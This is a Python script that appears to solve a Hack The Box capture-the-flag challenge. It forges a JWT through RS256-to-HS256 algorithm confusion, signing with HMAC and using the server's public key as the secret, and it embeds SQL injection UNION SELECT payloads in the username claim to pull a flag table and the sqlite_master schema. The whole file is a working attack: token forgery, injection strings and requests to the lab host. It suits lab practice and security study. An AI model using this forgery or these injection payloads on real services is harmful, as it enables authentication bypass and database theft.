import base64
import binascii
import time
import jwt
import hashlib
import hmac
import json
import requests


# -------------------------token_part-------------------------
# change algo from RS256 to HS256
# and make fake signature <= base64(hmac-sha256(header+payload))

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----
""" # last \n(0x0a) is needed!!!

now = int(time.time())
# AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--
header={"alg":"HS256","typ":"JWT"}
payload ={
    "username": "admin' AND 1=0 UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;-- ",    #Using username, we can fake identity and sql injection
    "pk": public_key,
    "iat": now
}

jwt_header = base64.b64encode(json.dumps(header).replace(" ","").encode()).decode().replace('=','') # make jwt_header
jwt_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().replace('=','') # make jwt_payload

to_sign = bytes(jwt_header+"."+jwt_payload, 'utf-8') # we will make signature using this

#hex_key=binascii.hexlify(public_key.encode())

signature=hmac.new(public_key.encode(),to_sign,hashlib.sha256).hexdigest() # make hmac-sha256
signature=binascii.a2b_hex(signature)
signature=base64.urlsafe_b64encode(signature).decode().replace('=','') # signature -> base64

token=jwt_header+"."+jwt_payload+"."+signature

print ("token: "+token)

url="http://docker.hackthebox.eu:30746/"
auth_url="http://docker.hackthebox.eu:30746/auth"

data={"username": "admin", "password": "admin"}
cookies={"session": token}	#Broken Authenticate

req=requests.session()

post=req.post(auth_url,data)
post_content=post.text.split('<div class="card-body">')[1].split("<br>")[0]
print(post_content,post.url)

req=requests.session()

get=req.get(url, cookies=cookies)
get_content=get.text.split()
print(len(get_content))

print (post_content,get_content)